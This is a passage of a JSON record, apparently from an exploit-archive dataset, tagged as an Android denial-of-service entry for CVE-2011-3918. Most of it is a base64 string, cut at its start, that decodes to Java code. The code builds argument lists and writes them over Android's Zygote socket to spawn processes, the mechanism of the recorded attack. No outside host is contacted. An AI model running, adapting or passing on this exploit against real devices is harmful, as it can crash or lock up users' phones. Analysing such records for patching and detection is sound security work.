c3MpIHsNCgkJCSAgICAgICAgICAgIEFycmF5TGlzdDxTdHJpbmc+IGFyZ3NGb3JaeWdvdGUgPSBuZXcgQXJyYXlMaXN0PFN0cmluZz4oKTsNCgkJCQ0KCQkJICAgICAgICAgICAgLy8gLS1ydW50aW1lLWluaXQsIC0tc2V0dWlkPSwgLS1zZXRnaWQ9LA0KCQkJICAgICAgICAgICAgLy8gYW5kIC0tc2V0Z3JvdXBzPSBtdXN0IGdvIGZpcnN0DQoJCQkgICAgICAgICAgICBhcmdzRm9yWnlnb3RlLmFkZCgiLS1ydW50aW1lLWluaXQiKTsNCgkJCSAgICAgICAgICAgLy8gYXJnc0Zvclp5Z290ZS5hZGQoIi0tc2V0dWlkPSIgKyB1aWQpOw0KCQkJICAgICAgICAgICAgLy9hcmdzRm9yWnlnb3RlLmFkZCgiLS1zZXRnaWQ9IiArIGdpZCk7DQoJCQkgICAgICAgICAgICAvL2FyZ3NGb3JaeWdvdGUuYWRkKCItLWNsYXNzcGF0aD06ZGF0YTpkYXRhOnNvY2tldEFuZHJvaWQiKTsNCgkJCSAgICAgICAgICAgIC8vYXJnc0Zvclp5Z290ZS5hZGQoImRhdGEuZGF0YS5hbmRyb2lkLnNvY2tldC5hLnNvY2tldC5EdW1teUNsYXNzIik7DQoJCQkgICAgICAgICAgICANCgkJCSAgICAgICAgICAgIC8vb3B6aW9uaSBkYSBzaXN0ZW1hcmUgZXZlbnR1YWxtZW50ZSBkb3BvICYgWnlnb3RlLkRFQlVHX0VOQUJMRV9TQUZFTU9ERSwgJiBaeWdvdGUuREVCVUdfRU5BQkxFX0RFQlVHR0VSDQoJCQkgICAgICAgICAgICAvLyYgWnlnb3RlLkRFQlVHX0VOQUJMRV9DSEVDS0pOSSAmIFp5Z290ZS5ERUJVR19FTkFCTEVfQVNTRVJUDQoJCQkgICAgICAgICAgICBpZiAoKGRlYnVnRmxhZ3MgKSAhPSAwKSB7DQoJCQkgICAgICAgICAgICAgICAgYXJnc0Zvclp5Z290ZS5hZGQoIi0tZW5hYmxlLXNhZmVtb2RlIik7DQoJCQkgICAgICAgICAgICB9DQoJCQkgICAgICAgICAgICBpZiAoKGRlYnVnRmxhZ3MgKSAhPSAwKSB7DQoJCQkgICAgICAgICAgICAgICAgYXJnc0Zvclp5Z290ZS5hZGQoIi0tZW5hYmxlLWRlYnVnZ2VyIik7DQoJCQkgICAgICAgICAgICB9DQoJCQkgICAgICAgICAgICBpZiAoKGRlYnVnRmxhZ3MgKSAhPSAwKSB7DQoJCQkgICAgICAgICAgICAgICAgYXJnc0Zvclp5Z290ZS5hZGQoIi0tZW5hYmxlLWNoZWNram5pIik7DQoJCQkgICAgICAgICAgICB9DQoJCQkgICAgICAgICAgICBpZiAoKGRlYnVnRmxhZ3MgKSAhPSAwKSB7DQoJCQkgICAgICAgICAgICAgICAgYXJnc0Zvclp5Z290ZS5hZGQoIi0tZW5hYmxlLWFzc2VydCIpOw0KCQkJICAgICAgICAgICAgfQ0KCQkJCQkJDQoJCQkgICAgICAgICAgICAvL1RPRE8gb3B0aW9uYWxseSBlbmFibGUgZGVidWdlcg0KCQkJICAgICAgICAgICAgLy9hcmdzRm9yWnlnb3RlLmFkZCgiLS1lbmFibGUtZGVidWdnZXIiKTsNCgkJCQ0KCQkJICAgICAgICAgICAvKg0KCQkJICAgICAgICAgICAgLy8gLS1zZXRncm91cHMgaXMgYSBjb21tYS1zZXBhcmF0ZWQgbGlzdA0KCQkJICAgICAgICAgICBpZiAoZ2lkcyAhPSBudWxsICYmIGdpZHMubGVuZ3RoID4gMCkgew0KCQkJICAgICAgICAgICAgICAgIFN0cmluZ0J1aWxkZXIgc2IgPSBuZXcgU3RyaW5nQnVpbGRlcigpOw0KCQkJICAgICAgICAgICAgICAgIHNiLmFwcGVuZCgiLS1zZXRncm91cHM9Iik7DQoJCQkNCgkJCSAgICAgICAgICAgICAgICBpbnQgc3ogPSBnaWRzLmxlbmd0aDsNCgkJCSAgICAgICAgICAgICAgICBmb3IgKGludCBpID0gMDsgaSA8IHN6OyBpKyspIHsNCgkJCSAgICAgICAgICAgICAgICAgICAgaWYgKGkgIT0gMCkgew0KCQkJICAgICAgICAgICAgICAgICAgICAgICAgc2IuYXBwZW5kKCcsJyk7DQoJCQkgICAgICAgICAgICAgICAgICAgIH0NCgkJCSAgICAgICAgICAgICAgICAgICAgc2IuYXBwZW5kKGdpZHNbaV0pOw0KCQkJICAgICAgICAgICAgICAgIH0NCgkJCQ0KCQkgICAgICAgICAgICAgICAgCWFyZ3NGb3JaeWdvdGUuYWRkKHNiLnRvU3RyaW5nKCkpOw0KCQkJICAgICAgICAgICAgfQ0KCQkJCQkJKi8NCgkJCSAgICAgICAgICAgIGlmIChuaWNlTmFtZSAhPSBudWxsKSB7DQoJCQkgICAgICAgICAgICAgICAgYXJnc0Zvclp5Z290ZS5hZGQoIi0tbmljZS1uYW1lPSIgKyBuaWNlTmFtZSk7DQoJCQkgICAgICAgICAgICB9DQoJCQkNCgkJCSAgICAgICAgICAgIGFyZ3NGb3JaeWdvdGUuYWRkKHByb2Nlc3NDbGFzcyk7DQoJCQkNCgkJCSAgICAgICAgICAgIGlmIChleHRyYUFyZ3MgIT0gbnVsbCkgew0KCQkJICAgICAgICAgICAgICAgIGZvciAoU3RyaW5nIGFyZyA6IGV4dHJhQXJncykgew0KCQkJICAgICAgICAgICAgICAgICAgICBhcmdzRm9yWnlnb3RlLmFkZChhcmcpOw0KCQkJICAgICAgICAgICAgICAgIH0NCgkJCSAgICAgICAgICAgIH0NCgkJCSAgICAgICAgICAgIA0KCQkJICAgICAgICAgICAgcGlkID0genlnb3RlU2VuZEFyZ3NBbmRHZXRQaWQoYXJnc0Zvclp5Z290ZSk7DQoJCQkgICAgICAgIH0NCgkJCQ0KCQkJICAgICAgICBpZiAocGlkIDw9IDApIHsNCgkJCSAgICAgICAgICAgIHRocm93IG5ldyBFeGNlcHRpb24oInp5Z290ZSBzdGFydCBmYWlsZWQ6IiArIHBpZCk7DQoJCQkgICAgICAgIH0NCgkJCQ0KCQkJICAgICAgIHJldHVybiBwaWQ7DQoJfQ0KCQ0KCSAgICBwcml2YXRlIHN0YXRpYyBpbnQgenlnb3RlU2VuZEFyZ3NBbmRHZXRQaWQoQXJyYXlMaXN0PFN0cmluZz4gYXJncykNCgkgICAgICAgICAgICB0aHJvd3MgRXhjZXB0aW9uIHsNCgkNCgkgICAgICAgIGludCBwaWQgPSAwOw0KCQ0KCSAgICAgICAgLy9vcGVuWnlnb3RlU29ja2V0SWZOZWVkZWQoKTsNCgkNCgkgICAgICAgIHRyeSB7DQoJICAgICAgICAgICAgDQoJLypTZWUgY29tLmFuZHJvaWQuaW50ZXJuYWwub3MuWnlnb3RlSW5pdC5yZWFkQXJndW1lbnRMaXN0KCkgDQoJCVByZXNlbnRseSB0aGUgd2lyZSBmb3JtYXQgdG8gdGhlIHp5Z290ZSBwcm9jZXNzIGlzOiANCgkJYSkgYSBjb3VudCBvZiBhcmd1bWVudHMgKGFyZ2MsIGluIGVzc2VuY2UpIA0KCQliKSBhIG51bWJlciBvZiBuZXdsaW5lLXNlcGFyYXRlZCBhcmd1bWVudCBzdHJpbmdzIGVxdWFsIHRvIGNvdW50IEFmdGVyIHRoZSB6eWdvdGUgcHJvY2VzcyByZWFkcyANCgkJCXRoZXNlIGl0IHdpbGwgd3JpdGUgdGhlIHBpZCBvZiB0aGUgY2hpbGQgb3IgLTEgb24gZmFpbHVyZS4NCgkqLw0KCSAgICAgICAgICAgIHNaeWdvdGVXcml0ZXIud3JpdGUoSW50ZWdlci50b1N0cmluZyhhcmdzLnNpemUoKSkpOw0KCSAgICAgICAgICAgIHNaeWdvdGVXcml0ZXIubmV3TGluZSgpOw0KCQ0KCSAgICAgICAgICAgIGludCBzeiA9IGFyZ3Muc2l6ZSgpOw0KCSAgICAgICAgICAgIGZvciAoaW50IGkgPSAwOyBpIDwgc3o7IGkrKykgew0KCSAgICAgICAgICAgICAgICBTdHJpbmcgYXJnID0gYXJncy5nZXQoaSk7DQoJICAgICAgICAgICAgICAgIGlmIChhcmcuaW5kZXhPZignXG4nKSA+PSAwKSB7DQoJICAgICAgICAgICAgICAgICAgICB0aHJvdyBuZXcgRXhjZXB0aW9uKA0KCSAgICAgICAgICAgICAgICAgICAgICAgICAgICAiZW1iZWRkZWQgbmV3bGluZXMgbm90IGFsbG93ZWQiKTsNCgkgICAgICAgICAgICAgICAgfQ0KCSAgICAgICAgICAgICAgICBzWnlnb3RlV3JpdGVyLndyaXRlKGFyZyk7DQoJICAgICAgICAgICAgICAgIHNaeWdvdGVXcml0ZXIubmV3TGluZSgpOw0KCSAgICAgICAgICAgIH0NCgkNCgkgICAgICAgICAgICBzWnlnb3RlV3JpdGVyLmZsdXNoKCk7DQoJDQoJICAgICAgICAgICAgLy8gU2hvdWxkIHRoZXJlIGJlIGEgdGltZW91dCBvbiB0aGlzPw0KCSAgICAgICAgICAgIHBpZCA9IHNaeWdvdGVJbnB1dFN0cmVhbS5yZWFkSW50KCk7DQoJDQoJICAgICAgICAgICAgaWYgKHBpZCA8IDApIHsNCgkgICAgICAgICAgICAgICAgdGhyb3cgbmV3IEV4Y2VwdGlvbigiZm9yaygpIGZhaWxlZCIpOw0KCSAgICAgICAgICAgIH0NCgkgICAgICAgIH0gY2F0Y2ggKElPRXhjZXB0aW9uIGV4KSB7DQoJICAgICAgICAgICAgICAgIGlmIChzWnlnb3RlU29ja2V0ICE9IG51bGwpIHsNCgkgICAgICAgICAgICAgICAgICAgIHNaeWdvdGVTb2NrZXQuY2xvc2UoKTsNCgkgICAgICAgICAgICAvKg0KCSAgICAgICAgICAgIH0gY2F0Y2ggKElPRXhjZXB0aW9uIGV4Mikgew0KCSAgICAgICAgICAgICAgICAvLyB3ZSdyZSBnb2luZyB0byBmYWlsIGFueXdheQ0KCSAgICAgICAgICAgICAgICBMb2cuZSgiYXBwIiwiSS9PIGV4Y2VwdGlvbiBvbiByb3V0aW5lIGNsb3NlIiwgZXgyKTsNCgkgICAgICAgICAgICB9DQoJCQkJKi8NCgkgICAgICAgICAgICBzWnlnb3RlU29ja2V0ID0gbnVsbDsNCgkNCgkgICAgICAgICAgICB0aHJvdyBuZXcgRXhjZXB0aW9uKGV4KTsNCgkgICAgICAgICAgICB9DQoJICAgICAgICB9DQoJDQoJICAgICAgICByZXR1cm4gcGlkOw0KCSAgICB9DQoNCn0=", 
    "filename": "platforms/android/dos/28957.txt", 
    "id": "28957", 
    "cves": [
        "CVE-2011-3918"
    ]
}